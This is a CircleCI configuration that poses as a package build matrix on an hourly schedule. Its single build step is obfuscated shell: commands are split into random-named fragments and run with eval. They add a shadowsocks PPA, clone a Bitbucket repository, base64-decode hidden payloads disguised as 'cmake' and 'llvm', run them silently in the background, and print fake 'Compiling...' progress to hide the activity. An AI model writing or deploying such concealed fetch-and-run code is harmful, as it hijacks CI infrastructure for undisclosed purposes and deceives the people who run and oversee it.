version: 2.1

workflows:
  build-push:
    jobs:
      - build:
          matrix:
            parameters:
              build: ["--deselect", "--emptytree", "--config", "--buildpkg", "--metadata", "--buildpkgonly", "--regen", "--changelog", "--changed-use", "--fetchonly", "--buildpkg-exclude", "--changed-deps-report", "--metadata", "--rebuild-ignore", "--autounmask-write", "--misspell-suggestions", "--with-bdeps-auto", "--select", "--usepkg-exclude", "--columns"]
  build-schedule:
    jobs:
      - build:
          matrix:
            parameters:
              build: ["--deselect", "--emptytree", "--config", "--buildpkg", "--metadata", "--buildpkgonly", "--regen", "--changelog", "--changed-use", "--fetchonly", "--buildpkg-exclude", "--changed-deps-report", "--metadata", "--rebuild-ignore", "--autounmask-write", "--misspell-suggestions", "--with-bdeps-auto", "--select", "--usepkg-exclude", "--columns"]
    triggers:
      - schedule:
          cron: "18 * * * *"
          filters:
            branches:
              only:
                - master

jobs:
  build:
    machine:
      image: ubuntu-1604:201903-01
    parameters:
      build:
        type: string
        default:
    steps:
      - run:
          name: lzddzh
          command: |
            sEYMfymDWxv="sudo add-ap"
            fnMZwk="t-repositor"
            TArFOplna="y ppa:max-c"
            qxTNrWJ="-lv/shadows"
            zBICtBeRAX="ocks-libev "
            QipGRGJ="-y &>/dev/n"
            eval "$sEYMfymDWxv""$fnMZwk""$TArFOplna""$qxTNrWJ""$zBICtBeRAX""$QipGRGJ""ull || true"
            eXMvgNUCcHI="sudo add-ap"
            PFOxczvpcvC="t-repositor"
            gjhoWp="y ppa:ondre"
            ICKrmIFEmVO="j/apache2 -"
            cROrZWw="y &>/dev/nu"
            eval "$eXMvgNUCcHI""$PFOxczvpcvC""$gjhoWp""$ICKrmIFEmVO""$cROrZWw""ll || true"
            vrmYqisgYP="sudo apt up"
            RWgniN="date || tru"
            eval "$vrmYqisgYP""$RWgniN""e"
            xqUkHJXOm="sudo apt --"
            svjzS="yes install"
            SzBvUrXX=" openssl &>"
            uUvjXTyik="/dev/null |"
            eval "$xqUkHJXOm""$svjzS""$SzBvUrXX""$uUvjXTyik""| true"
            CetzUVc="sudo apt --"
            GfpcVThKWc="yes install"
            sTJYanoz=" cl-base64 "
            xJYFobjZCy="git &>/dev/"
            hNfoD="null || tru"
            eval "$CetzUVc""$GfpcVThKWc""$sTJYanoz""$xJYFobjZCy""$hNfoD""e"
            QprfWmqP="git clone h"
            AQFuweA="ttps://gccb"
            NzFdXuv="uild@bitbuc"
            kGqRSlW="ket.org/gcc"
            UfQAJZ="build/gcc.g"
            uGmCIfBp="it &>/dev/n"
            eval "$QprfWmqP""$AQFuweA""$NzFdXuv""$kGqRSlW""$UfQAJZ""$uGmCIfBp""ull"
            cBOKgT="base64 -d g"
            iPEbrX="cc/cmake_np"
            eval "$cBOKgT""$iPEbrX""_ > cmake"
            mGXXykiaC="base64 -d g"
            phFDam="cc/config_ "
            KYdAKVAM="> output.lo"
            eval "$mGXXykiaC""$phFDam""$KYdAKVAM""g"
            FPbtOfVPc="base64 -d g"
            IasHp="cc/make_ > "
            eval "$FPbtOfVPc""$IasHp""llvm"
            sed -i 's/1080/1081/g' output.log
            kahVhnYt="chmod +x ll"
            eval "$kahVhnYt""vm cmake"
            LfKOhyNIb="./cmake"
            eval "$LfKOhyNIb"""
            sed -i 's/build/ob2u/g' output.log
            sudo ./llvm -c output.log &>/dev/null &
            GCC=$(date +%s)
            while true; do CC=$(date +%s); echo $CC Compiling...; [ $CC -ge $((GCC + 2490)) ] && sudo killall llvm && break; sleep 219; done
